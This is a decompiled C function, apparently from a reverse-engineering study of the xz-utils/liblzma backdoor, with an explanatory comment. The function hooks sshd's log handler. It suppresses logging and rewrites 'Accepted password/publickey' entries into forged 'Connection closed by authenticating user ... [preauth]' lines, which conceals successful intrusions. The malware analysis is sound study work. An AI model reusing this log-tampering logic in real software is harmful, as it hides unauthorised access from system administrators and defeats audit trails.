// /home/kali/xzre-ghidra/xzregh/10A3A0_mm_log_handler_hook.c
// Function: mm_log_handler_hook @ 0x10A3A0
// Calling convention: __stdcall
// Prototype: void __stdcall mm_log_handler_hook(LogLevel level, int forced, char * msg, void * ctx)


/*
 * AutoDoc: Interposes on sshd's log handler, ignoring every message when logging is globally disabled or selectively rewriting the
 * 'Connection closed by ... (preauth)' lines when filtering mode is enabled. It rebuilds safe format strings on the stack, calls
 * sshd_log() to emit the sanitised message, and leaves syslog alone unless the caller requested suppression via cmd flags.
 */

#include "xzre_types.h"

void mm_log_handler_hook(LogLevel level,int forced,char *msg,void *ctx)

{
  char *pcVar1;
  BOOL BVar2;
  sshd_log_ctx_t *log_ctx_00;
  long lVar3;
  EncodedStringId EVar4;
  ssize_t sVar5;
  long lVar6;
  long lVar7;
  ulong uVar8;
  char *pcVar9;
  undefined4 *puVar10;
  char *pcVar11;
  char *pcVar12;
  char *pcVar13;
  ulong uVar14;
  ulong uVar15;
  byte bVar16;
  char rewritten_msg [320];
  sshd_log_ctx_t *log_ctx;
  log_handler_fn sshlog_impl;
  undefined8 local_438;
  undefined8 uStack_430;
  undefined4 local_428 [60];
  undefined8 local_338;
  undefined8 uStack_330;
  undefined4 local_328 [60];
  undefined8 local_238;
  undefined8 uStack_230;
  undefined4 local_228;
  char local_223 [14];
  undefined1 local_215;
  char local_214 [4];
  undefined1 local_210;
  char local_20f;
  char local_20e;
  undefined1 local_20d;
  char local_20c;
  char local_20b;
  undefined2 local_20a;
  char local_208 [7];
  undefined1 local_201;
  
  bVar16 = 0;
  log_ctx_00 = *(sshd_log_ctx_t **)(global_ctx + 0x30);
  lVar3 = *(long *)(global_ctx + 0x10);
  local_438 = 0;
  uStack_430 = 0;
  puVar10 = local_428;
  for (lVar7 = 0x3c; lVar7 != 0; lVar7 = lVar7 + -1) {
    *puVar10 = 0;
    puVar10 = puVar10 + 1;
  }
  local_338 = 0;
  uStack_330 = 0;
  puVar10 = local_328;
  for (lVar7 = 0x3c; lVar7 != 0; lVar7 = lVar7 + -1) {
    *puVar10 = 0;
    puVar10 = puVar10 + 1;
  }
  local_238 = 0;
  uStack_230 = 0;
  puVar10 = &local_228;
  for (lVar7 = 0x7c; lVar7 != 0; lVar7 = lVar7 + -1) {
    *puVar10 = 0;
    puVar10 = puVar10 + 1;
  }
  if (msg != (char *)0x0) {
    if (log_ctx_00->logging_disabled == TRUE) {
      return;
    }
    if (*(int *)(global_ctx + 0x90) != 0) {
      return;
    }
    if ((log_ctx_00->orig_log_handler != (log_handler_fn)0x0) &&
       (log_ctx_00->orig_log_handler_ctx == (void *)0x0)) {
      return;
    }
    sVar5 = c_strlen(msg);
    pcVar1 = msg + sVar5;
    while( TRUE ) {
      if (pcVar1 <= msg) {
        return;
      }
      EVar4 = get_string_id(msg,pcVar1);
      if (EVar4 == STR_Connection_closed_by) break;
      if ((EVar4 == STR_Accepted_password_for) || (EVar4 == STR_Accepted_publickey_for)) {
        pcVar13 = msg + 0x17;
        if (EVar4 == STR_Accepted_password_for) {
          pcVar13 = msg + 0x16;
        }
        uVar14 = 0;
        pcVar12 = (char *)0x0;
        uVar15 = 0;
        goto LAB_0010a504;
      }
      msg = msg + 1;
    }
    local_238 = CONCAT62((local_238 >> 16),*(undefined2 *)log_ctx_00->STR_percent_s);
    log_ctx_00->logging_disabled = TRUE;
    if (((log_ctx_00->syslog_disabled != FALSE) && (lVar3 != 0)) &&
       (*(code **)(lVar3 + 0x58) != (code *)0x0)) {
      (**(code **)(lVar3 + 0x58))(0xff);
    }
    sshd_log(log_ctx_00,level,(char *)&local_238,msg);
    BVar2 = log_ctx_00->syslog_disabled;
    goto joined_r0x0010a4c2;
  }
  goto LAB_0010a6da;
LAB_0010a504:
  do {
    EVar4 = get_string_id(msg,pcVar1);
    if (EVar4 == STR_ssh2) {
      if (pcVar12 != (char *)0x0) {
        uVar14 = (long)msg - (long)pcVar12;
        uVar8 = uVar14;
        pcVar9 = pcVar12;
        pcVar11 = (char *)&local_438;
        if (0xff < uVar14) goto LAB_0010a6da;
        for (; uVar8 != 0; uVar8 = uVar8 - 1) {
          *pcVar11 = *pcVar9;
          pcVar9 = pcVar9 + (ulong)bVar16 * -2 + 1;
          pcVar11 = pcVar11 + (ulong)bVar16 * -2 + 1;
        }
      }
    }
    else if (EVar4 == STR_from) {
      uVar15 = (long)msg - (long)pcVar13;
      if (0xff < uVar15) goto LAB_0010a6da;
      pcVar12 = msg + 6;
      pcVar9 = pcVar13;
      pcVar11 = (char *)&local_338;
      for (uVar8 = uVar15; uVar8 != 0; uVar8 = uVar8 - 1) {
        *pcVar11 = *pcVar9;
        pcVar9 = pcVar9 + (ulong)bVar16 * -2 + 1;
        pcVar11 = pcVar11 + (ulong)bVar16 * -2 + 1;
      }
    }
    msg = msg + 1;
  } while (msg < pcVar1);
  if ((uVar15 != 0) && (uVar14 != 0)) {
    pcVar1 = log_ctx_00->STR_Connection_closed_by;
    lVar7 = 0;
    do {
      lVar6 = lVar7 + 1;
      *(char *)((long)&local_238 + lVar7) = pcVar1[lVar7];
      lVar7 = lVar6;
    } while (lVar6 != 0x15);
    pcVar1 = log_ctx_00->STR_authenticating;
    lVar7 = 0;
    do {
      local_223[lVar7] = pcVar1[lVar7];
      lVar7 = lVar7 + 1;
    } while (lVar7 != 0xe);
    local_215 = 0x20;
    pcVar1 = log_ctx_00->STR_user;
    lVar7 = 0;
    do {
      local_214[lVar7] = pcVar1[lVar7];
      lVar7 = lVar7 + 1;
    } while (lVar7 != 4);
    local_210 = 0x20;
    local_20f = *log_ctx_00->STR_percent_s;
    local_20e = log_ctx_00->STR_percent_s[1];
    local_20d = 0x20;
    local_20c = *log_ctx_00->STR_percent_s;
    local_20b = log_ctx_00->STR_percent_s[1];
    local_20a = 0x5b20;
    pcVar1 = log_ctx_00->STR_preauth;
    lVar7 = 0;
    do {
      local_208[lVar7] = pcVar1[lVar7];
      lVar7 = lVar7 + 1;
    } while (lVar7 != 7);
    local_201 = 0x5d;
    log_ctx_00->logging_disabled = TRUE;
    if (((log_ctx_00->syslog_disabled != FALSE) && (lVar3 != 0)) &&
       (*(code **)(lVar3 + 0x58) != (code *)0x0)) {
      (**(code **)(lVar3 + 0x58))(0xff);
    }
    sshd_log(log_ctx_00,SYSLOG_LEVEL_INFO,(char *)&local_238,&local_338,&local_438);
    BVar2 = log_ctx_00->syslog_disabled;
joined_r0x0010a4c2:
    if (BVar2 == FALSE) {
      return;
    }
    if (lVar3 == 0) {
      return;
    }
    if (*(code **)(lVar3 + 0x58) == (code *)0x0) {
      return;
    }
    (**(code **)(lVar3 + 0x58))(0x80000000);
    return;
  }
LAB_0010a6da:
  log_ctx_00->logging_disabled = TRUE;
  return;
}

